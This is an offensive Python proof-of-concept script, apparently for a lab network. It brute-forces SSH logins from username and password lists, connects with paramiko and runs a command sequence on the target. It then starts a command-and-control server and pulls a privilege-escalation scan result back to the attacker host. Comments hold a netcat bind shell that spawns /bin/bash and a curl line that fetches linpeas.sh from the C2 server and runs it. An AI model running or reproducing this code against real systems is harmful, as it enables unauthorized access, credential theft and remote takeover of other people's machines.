#!/bin/python3
from pathlib import Path
from subprocess import run, PIPE
import paramiko
from sys import argv
from post.postexploit import openCtrlSrv
from autopwn import flushProcesses
import sequences as s

def processList(inp = "")->list:
    """ Function that process lists txts in lists. """
    with open(inp, "r+") as f:
            tmp = f.readlines()
    lst = []
    for k in tmp:
        lst.append(k.strip())
    return lst


def getSshCredsAndConn(ulist="",plist="",domain="")->tuple[(str,str)]:
    """ Slow bruteforce of ssh credentials. """   
    uname = processList(ulist) 
    passwd = processList(plist)
    retUsr = "x"
    retPass= "x" 
    for user in uname:
        for password in passwd:
            command = f"echo 'exit' | sshpass -p {password} ssh {user}@{domain}"
            print(f"Trying to execute: '{command[15:]}' ")
            proc = run(command,shell=True,stderr=PIPE,stdout=PIPE) # Output is piped 
            # print(f"$? = {proc.returncode}") -- Debug
            if proc.returncode == 0 or proc.returncode == 1:
                print(f"SSH password for {user} in {domain} is {password}")
                retUsr = user
                retPass = password
                break
        if proc.returncode == 0 or proc.returncode == 1:
            break
    return (retUsr,retPass)

def autoSshPawn(usr,password,host,sequence)-> int:
    """ Take ssh credentials to connect and remotely runs\\
        instructions on target machine. """
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(host,username=usr,password=password)
    except paramiko.AuthenticationException:
        print(f"Can't connect to SSH client.")
        exit(-1)
    
    print(f"Pawning machine through SSH ...")
    for instruction in sequence:
        print(f"[Command] {instruction}")
        stdin, stdout, stderr = ssh.exec_command(instruction,timeout=30) # nc -l -p 55555 -e /bin/bash')
        print(f"[Output] "+ stdout.read().decode("utf8"))
    return 0


if __name__ == "__main__":

    flushProcesses()

    print("*** POC : SSH Pawn ***")

    attackAddr = '192.168.1.86'
    attacker="test"

    if len(argv) > 1:
        target = argv[1]
    else:
        target = '192.168.1.188'
        
    usr,pwd = getSshCredsAndConn(ulist="./init/userlist",plist="./init/passlist",domain=target)

    if usr and pwd:
        print(f"Credentials user = {usr} | password = {pwd}")
        proc, port = openCtrlSrv(bindaddr=attackAddr)
        srv = f"{attackAddr}:{port}"
        print(f"Command and Control server @{srv} !")

        # Useful sequence : 
        # sequence = ["whoami",
        #             "pwd",
        #             "curl -s " + srv + "/post/vir/linpeas.sh -o linpeas.sh > /dev/null",
        #             "chmod +x linpeas.sh",
        #             "./linpeas.sh > ./linout"]
        
        autoSshPawn(usr,pwd,target,s.SEQUENCE_2)

        print(f"[Local command] scp {usr}@{target}:/home/vargant/linout .")
        proc = run(f"scp {usr}@{target}:/home/vagrant/linout {attacker}@{attackAddr}:.",shell=True)

        print(f"*** End of POC ***")
        
        exit(0)
